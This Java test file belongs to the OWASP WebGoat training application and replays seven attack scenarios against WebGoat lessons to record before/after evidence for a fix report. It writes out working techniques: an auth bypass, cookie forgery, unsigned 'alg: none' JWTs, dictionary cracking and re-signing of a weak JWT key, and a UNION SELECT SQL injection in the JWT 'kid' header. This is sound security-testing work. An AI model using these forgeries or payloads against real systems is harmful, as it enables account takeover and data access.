package org.owasp.webgoat.rgr;

import com.fasterxml.jackson.databind.ObjectMapper;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.impl.TextCodec;
import jakarta.servlet.http.Cookie;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.owasp.webgoat.container.plugins.LessonTest;
import org.owasp.webgoat.lessons.authbypass.AccountVerificationHelper;
import org.owasp.webgoat.lessons.hijacksession.cas.HijackSessionAuthenticationProvider;
import org.owasp.webgoat.lessons.jwt.JWTRefreshEndpoint;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.test.web.servlet.RequestBuilder;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;

/**
 * Evidence recorder for the RGR report (not an assertion test): replays each attack scenario
 * in-process and writes "request -> response" transcripts to ${rgr.evidence.dir}. Run on the
 * baseline and on the fixed code to obtain before/after evidence.
 */
class RgrEvidenceTest extends LessonTest {

  private final ObjectMapper om = new ObjectMapper();
  private final StringBuilder log = new StringBuilder();

  private Path dir() throws Exception {
    Path d = Path.of(System.getProperty("rgr.evidence.dir", "target/rgr-evidence"));
    Files.createDirectories(d);
    return d;
  }

  private void save(String name) throws Exception {
    Files.writeString(dir().resolve(name + ".txt"), log.toString(), StandardCharsets.UTF_8);
    log.setLength(0);
  }

  private MockHttpServletResponse call(String title, RequestBuilder rb, String requestText)
      throws Exception {
    MockHttpServletResponse r = mockMvc.perform(rb).andReturn().getResponse();
    log.append("### ").append(title).append('\n');
    log.append(">>> ").append(requestText).append('\n');
    log.append("<<< HTTP ").append(r.getStatus()).append('\n');
    for (Cookie c : r.getCookies()) {
      log.append("<<< Set-Cookie: ")
          .append(c.getName())
          .append('=')
          .append(c.getValue())
          .append(c.isHttpOnly() ? "; HttpOnly" : "")
          .append(c.getSecure() ? "; Secure" : "")
          .append('\n');
    }
    String body = r.getContentAsString().replaceAll("\\s+", " ").trim();
    if (body.length() > 600) body = body.substring(0, 600) + " ...";
    log.append("<<< ").append(body).append("\n\n");
    return r;
  }

  @Test
  void v1_authBypass() throws Exception {
    var h = new AccountVerificationHelper();
    var renamed = new HashMap<String, String>(Map.of("secQuestion2", "x", "secQuestion3", "y"));
    log.append("### V1 verifyAccount(1223445, {secQuestion2=x, secQuestion3=y})\n<<< ")
        .append(h.verifyAccount(1223445, renamed))
        .append("\n\n");
    call(
        "V1 POST /auth-bypass/verify-account (renamed parameters)",
        MockMvcRequestBuilders.post("/auth-bypass/verify-account")
            .param("secQuestion2", "x")
            .param("secQuestion3", "y")
            .param("jsEnabled", "1")
            .param("verifyMethod", "SEC_QUESTIONS")
            .param("userId", "12309746"),
        "POST /WebGoat/auth-bypass/verify-account  secQuestion2=x&secQuestion3=y&jsEnabled=1"
            + "&verifyMethod=SEC_QUESTIONS&userId=12309746");
    save("V1-auth-bypass");
  }

  @Test
  void v2_sessionIds() throws Exception {
    log.append("### V2 five consecutive session ids from AUTHENTICATION_SUPPLIER\n");
    for (int i = 0; i < 5; i++) {
      log.append("<<< ")
          .append(HijackSessionAuthenticationProvider.AUTHENTICATION_SUPPLIER.get().getId())
          .append('\n');
    }
    log.append('\n');
    call(
        "V2 POST /HijackSession/login",
        MockMvcRequestBuilders.post("/HijackSession/login")
            .param("username", "webgoat")
            .param("password", "webgoat"),
        "POST /WebGoat/HijackSession/login  username=webgoat&password=webgoat");
    save("V2-session-id");
  }

  @Test
  void v3_cookieForgery() throws Exception {
    String s = new StringBuilder("tom" + "AAAAAAAAAA").reverse().toString();
    StringBuilder hex = new StringBuilder();
    for (byte b : s.getBytes(StandardCharsets.UTF_8)) hex.append(String.format("%02x", b));
    String forged =
        Base64.getEncoder().encodeToString(hex.toString().getBytes(StandardCharsets.UTF_8));
    call(
        "V3 legitimate login as webgoat (cookie format)",
        MockMvcRequestBuilders.post("/SpoofCookie/login")
            .param("username", "webgoat")
            .param("password", "webgoat"),
        "POST /WebGoat/SpoofCookie/login  username=webgoat&password=webgoat");
    call(
        "V3 forged cookie for tom, computed offline",
        MockMvcRequestBuilders.post("/SpoofCookie/login")
            .cookie(new Cookie("spoof_auth", forged))
            .param("username", "")
            .param("password", ""),
        "POST /WebGoat/SpoofCookie/login  Cookie: spoof_auth=" + forged);
    save("V3-cookie-forgery");
  }

  @Test
  void v4_algNone() throws Exception {
    Claims c = Jwts.claims();
    c.put("admin", "true");
    c.put("user", "Tom");
    String token = Jwts.builder().setClaims(c).setHeaderParam("alg", "none").compact();
    call(
        "V4 POST /JWT/votings with unsigned admin token",
        MockMvcRequestBuilders.post("/JWT/votings")
            .contentType(MediaType.APPLICATION_JSON)
            .cookie(new Cookie("access_token", token)),
        "POST /WebGoat/JWT/votings  Cookie: access_token=" + token);
    save("V4-alg-none");
  }

  @Test
  void v5_weakKey() throws Exception {
    String body = mockMvc.perform(MockMvcRequestBuilders.get("/JWT/secret/gettoken"))
        .andReturn().getResponse().getContentAsString();
    String found = "none";
    for (String w : new String[] {"victory", "business", "available", "shipping", "washington"}) {
      try {
        Jwts.parser().setSigningKey(TextCodec.BASE64.encode(w)).parseClaimsJws(body.trim());
        found = w;
        break;
      } catch (Exception ignored) {
        // wrong guess
      }
    }
    log.append("### V5 offline dictionary attack on token from GET /JWT/secret/gettoken\n")
        .append(">>> token: ").append(body.trim()).append('\n')
        .append("<<< recovered key: ").append(found).append("\n\n");
    if (!"none".equals(found)) {
      String forged =
          Jwts.builder()
              .setIssuer("WebGoat Token Builder").setAudience("webgoat.org")
              .setIssuedAt(new Date()).setExpiration(new Date(System.currentTimeMillis() + 60000))
              .setSubject("tom@webgoat.org").claim("username", "WebGoat")
              .claim("Email", "tom@webgoat.org").claim("Role", new String[] {"Manager"})
              .signWith(SignatureAlgorithm.HS256, TextCodec.BASE64.encode(found)).compact();
      call("V5 POST /JWT/secret with re-signed token (username=WebGoat)",
          MockMvcRequestBuilders.post("/JWT/secret").param("token", forged),
          "POST /WebGoat/JWT/secret  token=" + forged);
    }
    save("V5-weak-key");
  }

  @Test
  void v6_kidInjection() throws Exception {
    String key = "deletingTom";
    String kid = "x' UNION SELECT '" + key + "' FROM INFORMATION_SCHEMA.SYSTEM_USERS --";
    String token = Jwts.builder().setHeaderParam("kid", kid)
        .setClaims(new HashMap<>(Map.of("username", "Tom")))
        .signWith(SignatureAlgorithm.HS512, key).compact();
    call("V6 POST /JWT/kid/delete, kid with UNION SELECT",
        MockMvcRequestBuilders.post("/JWT/kid/delete").param("token", token),
        "POST /WebGoat/JWT/kid/delete  token=<header.kid=\"" + kid + "\">");
    String token2 = Jwts.builder().setHeaderParam("kid", "'")
        .setClaims(new HashMap<>(Map.of("username", "Tom")))
        .signWith(SignatureAlgorithm.HS512, "whatever").compact();
    try {
      call("V6 POST /JWT/kid/delete, kid=' (error disclosure)",
          MockMvcRequestBuilders.post("/JWT/kid/delete").param("token", token2),
          "POST /WebGoat/JWT/kid/delete  token=<header.kid=\"'\">");
    } catch (Exception e) {
      log.append("<<< unhandled exception: ").append(e.getClass().getSimpleName()).append(": ")
          .append(String.valueOf(e.getMessage())).append("\n\n");
    }
    save("V6-kid-sqli");
  }

  @Test
  @SuppressWarnings("unchecked")
  void v7_refreshBinding() throws Exception {
    String body = call("V7 login as Jerry",
        MockMvcRequestBuilders.post("/JWT/refresh/login").contentType(MediaType.APPLICATION_JSON)
            .content(om.writeValueAsString(Map.of("user", "Jerry", "password",
                JWTRefreshEndpoint.PASSWORD))),
        "POST /WebGoat/JWT/refresh/login  {\"user\":\"Jerry\",\"password\":\"***\"}")
        .getContentAsString();
    String jerryRefresh = (String) om.readValue(body, Map.class).get("refresh_token");
    Field f = JWTRefreshEndpoint.class.getDeclaredField("JWT_PASSWORD");
    f.setAccessible(true);
    String tomExpired = Jwts.builder()
        .setClaims(new HashMap<>(Map.of("admin", "false", "user", "Tom")))
        .setIssuedAt(new Date(1526131411000L)).setExpiration(new Date(1526217811000L))
        .signWith(SignatureAlgorithm.HS512, (String) f.get(null)).compact();
    call("V7 POST /JWT/refresh/newToken: Tom's expired token + Jerry's refresh token",
        MockMvcRequestBuilders.post("/JWT/refresh/newToken")
            .header("Authorization", "Bearer " + tomExpired)
            .contentType(MediaType.APPLICATION_JSON)
            .content(om.writeValueAsString(Map.of("refresh_token", jerryRefresh))),
        "POST /WebGoat/JWT/refresh/newToken  Authorization: Bearer <Tom, exp=2018-05-13>  "
            + "{\"refresh_token\":\"" + jerryRefresh + "\" (Jerry's)}");
    save("V7-refresh-binding");
  }
}
